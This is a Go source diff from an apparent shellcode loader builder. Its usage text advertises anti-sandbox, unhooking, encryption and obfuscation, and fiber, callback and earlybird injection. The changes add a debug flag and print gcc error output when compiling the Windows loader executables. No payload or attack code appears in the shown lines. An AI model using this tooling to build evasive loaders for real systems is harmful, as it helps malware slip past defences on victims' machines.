@@ -1,6 +1,7 @@
 package Others
 
 import (
+	"bytes"
 	"fmt"
 	"log"
 	"os"
@@ -21,6 +22,7 @@ type FlagOptions struct {
 	Sandbox     bool
 	Unhook      bool
 	Loading     string
+	Debug       bool
 }
 
 func PrintVersion() {
@@ -49,6 +51,7 @@ func PrintUsage() {
 	fmt.Println("  -sandbox <true/false>: 是否开启反沙箱模式 (默认为 'false'，即不开启)")
 	fmt.Println("  -unhook <true/false>: 是否使用 unhook 模式 (默认为 'false'，即使用系统调用)")
 	fmt.Println("  -loading <loadingTechnique>: 选择 Shellcode 的加载方式 (默认为 'fiber'，可选值: callback, fiber, earlybird)")
+	fmt.Println("  -debug  <true/false>: 是否打印shellcode中间加密/混淆过程(默认为 'false'，即不打印)")
 }
 
 func PrintKeyDetails(key string) {
@@ -109,20 +112,38 @@ func Build(options *FlagOptions, outfile string, framework int) {
 		case "aes":
 			switch strings.ToLower(options.Obfuscation) {
 			case "uuid":
-				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o3", "-o", outexe, outfile, "sys_32.c", "aes.c", "-s", "-masm=intel", "-lrpcrt4")
+				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o", outexe, outfile, "sys_32.c", "aes.c", "-s", "-masm=intel", "-lrpcrt4")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
 			case "words":
-				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o3", "-o", outexe, outfile, "sys_32.c", "aes.c", "-s", "-masm=intel")
+				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o", outexe, outfile, "sys_32.c", "aes.c", "-s", "-masm=intel")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
@@ -130,20 +151,38 @@ func Build(options *FlagOptions, outfile string, framework int) {
 		case "xor":
 			switch strings.ToLower(options.Obfuscation) {
 			case "uuid":
-				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o3", "-o", outexe, outfile, "sys_32.c", "-s", "-masm=intel", "-lrpcrt4")
+				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o", outexe, outfile, "sys_32.c", "-s", "-masm=intel", "-lrpcrt4")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
 			case "words":
-				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o3", "-o", outexe, outfile, "sys_32.c", "-s", "-masm=intel")
+				cmd := exec.Command("gcc", "-mwindows", "-m32", "-o", outexe, outfile, "sys_32.c", "-s", "-masm=intel")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
@@ -154,20 +193,38 @@ func Build(options *FlagOptions, outfile string, framework int) {
 		case "aes":
 			switch strings.ToLower(options.Obfuscation) {
 			case "uuid":
-				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o3", "-o", outexe, outfile, "sys_64.c", "aes.c", "-s", "-masm=intel", "-lrpcrt4")
+				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o", outexe, outfile, "sys_64.c", "aes.c", "-s", "-masm=intel", "-lrpcrt4")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
 			case "words":
-				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o3", "-o", outexe, outfile, "sys_64.c", "aes.c", "-s", "-masm=intel")
+				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o", outexe, outfile, "sys_64.c", "aes.c", "-s", "-masm=intel")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
@@ -175,20 +232,38 @@ func Build(options *FlagOptions, outfile string, framework int) {
 		case "xor":
 			switch strings.ToLower(options.Obfuscation) {
 			case "uuid":
-				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o3", "-o", outexe, outfile, "sys_64.c", "-s", "-masm=intel", "-lrpcrt4")
+				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o", outexe, outfile, "sys_64.c", "-s", "-masm=intel", "-lrpcrt4")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
 			case "words":
-				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o3", "-o", outexe, outfile, "sys_64.c", "-s", "-masm=intel")
+				cmd := exec.Command("gcc", "-mwindows", "-m64", "-o", outexe, outfile, "sys_64.c", "-s", "-masm=intel")
 				// 执行命令并等待其完成
+				var stdout, stderr bytes.Buffer
+				cmd.Stdout = &stdout
+				cmd.Stderr = &stderr
+
 				err := cmd.Run()
 				if err != nil {
 					fmt.Println("编译失败:", err)
+					// 获取标准错误的内容
+					stderrString := stderr.String()
+					if stderrString != "" {
+						fmt.Println("标准错误:", stderrString)
+					}
 					return
 				}
 				fmt.Printf("编译成功: " + outexe)
